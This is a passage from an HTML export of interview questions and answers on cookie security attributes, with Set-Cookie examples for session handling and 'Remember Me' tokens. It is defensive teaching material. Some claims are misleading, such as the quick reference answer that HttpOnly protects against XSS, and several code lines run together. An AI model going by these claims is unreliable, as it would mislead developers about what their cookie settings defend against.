</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8046-a147-e6961ca74049" class=""><strong>3. Invalid __Host- prefix usage:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8079-9d65-d669279625b2" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Problem: __Host- prefix with Domain attributeSet-Cookie: __Host-sessionId=abc123; Domain=example.com; Secure; Path=/
// Browser will reject it// Solution: Remove Domain attributeSet-Cookie: __Host-sessionId=abc123; Secure; Path=/
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8059-827b-f3004ae7869c" class=""><strong>4. Path mismatch:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80be-8918-ed1fe7f75750" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie set with Path=/apiSet-Cookie: sessionId=abc123; Path=/api
// Cookie not sent with requests to /// Solution: Use Path=/ for site-wide cookies</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-804a-8a4b-d4fc486124a9" class=""><strong>5. Domain mismatch:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-809f-ae7c-fdc0b67b7a67" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie set for example.comSet-Cookie: sessionId=abc123; Domain=example.com
// Cookie not sent to www.example.com (if Domain not set)// Or cookie sent to all subdomains (if Domain=.example.com)</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-808d-b450-f229a2422485"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-808b-bfa6-f10c94c9081b" class=""><strong>Q17: Users are getting logged out unexpectedly. What could cause this?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80e7-a05b-e3d87a755fe7" class=""><strong>Answer:</strong> Common causes:</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f6-9ee8-e98256f8f324" class=""><strong>1. SameSite=Strict with external links:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8053-84c7-efa0780bf435" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Problem: Cookie not sent with external link clicksSet-Cookie: sessionId=abc123; SameSite=Strict
// Solution: Use SameSite=LaxSet-Cookie: sessionId=abc123; SameSite=Lax
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-805c-aeb8-e0275e0c6405" class=""><strong>2. Cookie expiration:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80b1-b31c-cb2697feda99" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Problem: Short Max-AgeSet-Cookie: sessionId=abc123; Max-Age=300// 5 minutes// Solution: Increase Max-Age or implement refresh mechanismSet-Cookie: sessionId=abc123; Max-Age=3600// 1 hour</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8022-9397-ecd338bc3012" class=""><strong>3. Browser blocking third-party cookies:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8003-8f30-c106e3830e64" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Problem: SameSite=None cookies blockedSet-Cookie: sessionId=abc123; SameSite=None; Secure
// Some browsers block third-party cookies by default// Solution: Use alternative authentication (OAuth, tokens)</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80bb-8971-fcbb608e8441" class=""><strong>4. Server-side session expiration:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8065-9dca-d36435f170ab" class="bulleted-list"><li style="list-style-type:disc">Check server-side session timeout</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8095-8a61-cf7450588fa3" class="bulleted-list"><li style="list-style-type:disc">Implement session refresh mechanism</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-803d-86f1-e4ac5a6d86d7" class="bulleted-list"><li style="list-style-type:disc">Check for session cleanup jobs</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80f9-b408-f8c8d9cdf602"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-8010-8d90-e24bd12ae202" class=""><strong>Advanced Questions</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8047-811c-d7cfa87be3a6" class=""><strong>Q18: Explain the difference between HttpOnly, Secure, and SameSite attributes.</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80db-90ca-c084da59d51b" class=""><strong>Answer:</strong></p></div><div style="display:contents" dir="ltr"><table id="2b2562ad-76f0-80c3-843b-ca215ae496a6" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-8068-843a-e650330a3289"><th id="Dg|}" class="simple-table-header-color simple-table-header">Attribute</th><th id="T{~w" class="simple-table-header-color simple-table-header">Protects Against</th><th id="@;oP" class="simple-table-header-color simple-table-header">How It Works</th><th id="x_RU" class="simple-table-header-color simple-table-header">When to Use</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-806f-9462-cac2c7477985"><td id="Dg|}" class=""><strong>HttpOnly</strong></td><td id="T{~w" class="">XSS (cookie theft)</td><td id="@;oP" class="">Prevents JavaScript access to cookies</td><td id="x_RU" class="">Always for sensitive cookies</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-80c1-b75c-def6aab62c45"><td id="Dg|}" class=""><strong>Secure</strong></td><td id="T{~w" class="">MitM attacks</td><td id="@;oP" class="">Ensures HTTPS-only transmission</td><td id="x_RU" class="">Always in production</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b2562ad-76f0-801c-b827-ef83b7c45ef7"><td id="Dg|}" class=""><strong>SameSite</strong></td><td id="T{~w" class="">CSRF attacks</td><td id="@;oP" class="">Controls cross-site cookie sending</td><td id="x_RU" class="">Always (Strict or Lax)</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8005-8afb-de476262b79b" class=""><strong>HttpOnly:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80a9-961b-ca394ac5dd28" class="bulleted-list"><li style="list-style-type:disc">Prevents <code>document.cookie</code> access</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80ce-8420-c1cdf1ee7979" class="bulleted-list"><li style="list-style-type:disc">Protects against XSS cookie theft</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80e9-9629-e6819724153f" class="bulleted-list"><li style="list-style-type:disc">Does NOT prevent CSRF</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80b1-9840-f3bb1f917ebc" class=""><strong>Secure:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8013-a68a-cfcd801e0c67" class="bulleted-list"><li style="list-style-type:disc">Requires HTTPS connection</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-809a-b45d-e2c4843673ba" class="bulleted-list"><li style="list-style-type:disc">Prevents interception over HTTP</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80e4-acd6-e776f5ba0d46" class="bulleted-list"><li style="list-style-type:disc">Required for <code>SameSite=None</code></li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8027-83bc-f29178211f98" class=""><strong>SameSite:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-802d-9989-f6573c98009f" class="bulleted-list"><li style="list-style-type:disc">Controls when cookies are sent</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-804f-b09f-c6c73d88fd80" class="bulleted-list"><li style="list-style-type:disc"><code>Strict</code>: Same-site only</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8005-b1a3-edcbcc4841a7" class="bulleted-list"><li style="list-style-type:disc"><code>Lax</code>: Same-site + top-level GET</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8024-b92e-d8cb33207308" class="bulleted-list"><li style="list-style-type:disc"><code>None</code>: All requests (requires Secure)</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-808e-95b0-c8b950926e26" class=""><strong>Best practice:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8024-9ed3-c66809578261" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
// All three together provide comprehensive protection</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80db-9d93-e76267878a27"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8048-9c42-e0fc8f46856c" class=""><strong>Q19: How do you implement &quot;Remember Me&quot; functionality securely?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c9-8b4d-c4686a86b20e" class=""><strong>Answer:</strong> Use separate cookies with different lifespans:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8025-ad5b-ccff142a4c61" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Short-lived session cookieSet-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600

// Long-lived remember me tokenSet-Cookie: __Secure-rememberToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=2592000
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80e3-8716-c4a8f0bfb9b2" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80f6-9385-f7c662713099" class="numbered-list" start="1"><li>User logs in and checks &quot;Remember Me&quot;</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80d3-b903-cd558e904c10" class="numbered-list" start="2"><li>Server generates two tokens:<div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80fd-a6ae-cedcec006192" class="bulleted-list"><li style="list-style-type:disc">Session token (short-lived, e.g., 1 hour)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8075-9fc8-c03de04d830d" class="bulleted-list"><li style="list-style-type:disc">Remember token (long-lived, e.g., 30 days)</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80e8-b48c-fa701bf78fd4" class="numbered-list" start="3"><li>Both stored in HttpOnly, Secure cookies</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8084-8b6b-eb1d51294f62" class="numbered-list" start="4"><li>On each request:<div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80df-9f15-ca1dc1ca0982" class="bulleted-list"><li style="list-style-type:disc">If session token valid: user is authenticated</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-805a-9de4-f8c9ea183a39" class="bulleted-list"><li style="list-style-type:disc">If session token expired but remember token valid: refresh session token</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-803a-8986-c73f75398c82" class="bulleted-list"><li style="list-style-type:disc">If both expired: require re-authentication</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d7-a5cc-d42503ef8e76" class=""><strong>Security considerations:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-808b-8a7b-c7dd92a010d8" class="bulleted-list"><li style="list-style-type:disc">Remember token should be cryptographically random</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80f8-b0c0-f7d998bcf5b2" class="bulleted-list"><li style="list-style-type:disc">Store token hash on server (not plain token)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80d2-bdfe-edec233bc85c" class="bulleted-list"><li style="list-style-type:disc">Implement token rotation on use</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-806e-a420-c14c1a599c83" class="bulleted-list"><li style="list-style-type:disc">Allow users to revoke remember tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8050-a5b8-d9d25a313414" class="bulleted-list"><li style="list-style-type:disc">Monitor for suspicious activity</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80fd-96b0-f047343e8a10"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8082-84a1-e557ab0fd2b1" class=""><strong>Q20: How do cookie security attributes work together in a defense-in-depth strategy?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-807d-976d-d91cff6e9f8e" class=""><strong>Answer:</strong> Each attribute provides a different layer of protection:</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8045-89b2-e017dabeef22" class=""><strong>Layer 1: HttpOnly (XSS Protection)</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-800a-beea-c12399fb2f28" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">HttpOnly: Prevents JavaScript from stealing cookies
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-806b-b2ca-ed8159db8669" class=""><strong>Layer 2: Secure (Transmission Protection)</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8017-a06d-de5b5bf669ea" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Secure: Ensures cookies only sent over HTTPS
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80bd-95e9-c3ee1675d175" class=""><strong>Layer 3: SameSite (CSRF Protection)</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8077-ab79-f6b32ff32f52" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">SameSite: Prevents cookies from being sent with cross-site requests
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-807e-a79d-cd963fd494ae" class=""><strong>Layer 4: Cookie Prefixes (Enforcement)</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80ea-83cb-ce5224fdad53" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">__Host- or __Secure-: Browser-level enforcement of security rules
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f3-b27b-e6a80bc0671d" class=""><strong>Layer 5: Short Expiration (Exposure Limitation)</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8055-b87c-e1d8a3a929c5" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Max-Age: Limits window of exposure if cookie is compromised
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-803a-9c27-c98b0226c8aa" class=""><strong>Complete defense-in-depth:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80a1-afb5-c48a05505e74" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80ac-afda-cb64ff67fed3" class=""><strong>Additional layers:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-804c-9574-c994994e9426" class="bulleted-list"><li style="list-style-type:disc">Server-side session validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-807f-851c-d38596aaceab" class="bulleted-list"><li style="list-style-type:disc">IP address validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80b2-9fa3-fd91b4729c9c" class="bulleted-list"><li style="list-style-type:disc">User-Agent validation</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-807e-b390-cd1415b8b4c0" class="bulleted-list"><li style="list-style-type:disc">Rate limiting</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8031-87eb-ecf9d9f4f246" class="bulleted-list"><li style="list-style-type:disc">Anomaly detection</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80b8-a270-c98fe31f7504" class="bulleted-list"><li style="list-style-type:disc">Regular token rotation</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d8-b3b3-c7bab88e8304" class=""><strong>Why defense-in-depth matters:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8093-8266-d8fa6e60a3b0" class="bulleted-list"><li style="list-style-type:disc">If one layer fails, others provide protection</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8077-9ee2-cd791bdb0253" class="bulleted-list"><li style="list-style-type:disc">No single security measure is perfect</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80bf-87a6-cdb05516e72c" class="bulleted-list"><li style="list-style-type:disc">Multiple layers make attacks more difficult</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-803c-9300-ef1f2a0f280f" class="bulleted-list"><li style="list-style-type:disc">Provides redundancy and resilience</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80be-8993-cb0659b8406b"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-80bf-a6ad-fdd53919daaf" class=""><strong>Quick Reference Answers</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8010-b996-d3dca12da327" class=""><strong>What protects against XSS?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80a6-b85e-eeabee248a67" class=""><strong>Answer:</strong> HttpOnly attribute</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8071-8ba2-f8ab21729426" class=""><strong>What protects against CSRF?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-808a-ba2e-c4dc3da22503" class=""><strong>Answer:</strong> SameSite attribute (Strict or Lax) or CSRF tokens</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80d7-b790-c90c06248b33" class=""><strong>What protects against MitM attacks?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80ad-b15f-f63b3f02680a" class=""><strong>Answer:</strong> Secure attribute (HTTPS)</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80d2-98b8-d3dc10ad9d59" class=""><strong>What is the recommended cookie configuration?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80e1-acf7-c0feaf0f1c85" class=""><strong>Answer:</strong> <code>__Secure-sessionId=token; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600</code></p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8007-a470-e944d925ce6b" class=""><strong>Does HttpOnly protect against CSRF?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c2-acc6-d27bdd96eb98" class=""><strong>Answer:</strong> No, HttpOnly only protects against XSS. Use SameSite or CSRF tokens for CSRF protection.</p></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80c2-959b-fddd38b2e0dc"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-802f-a0a5-fee93fa154b0" class=""><strong>Summary</strong></h2></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8085-a396-ebf80f1590db" class="">These interview questions cover:</p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-802e-99b2-eef76ddd7a9f" class="bulleted-list"><li style="list-style-type:disc">✅ Fundamental concepts (HttpOnly, Secure, SameSite)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8004-b2d5-ef1d41d83880" class="bulleted-list"><li style="list-style-type:disc">✅ Common misconceptions (HttpOnly vs CSRF)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-801c-b2b1-fabf607518c1" class="bulleted-list"><li style="list-style-type:disc">✅ Real-world scenarios</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-809e-8546-f7ae5003ec29" class="bulleted-list"><li style="list-style-type:disc">✅ Implementation details</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80d2-a77c-db891511dfc2" 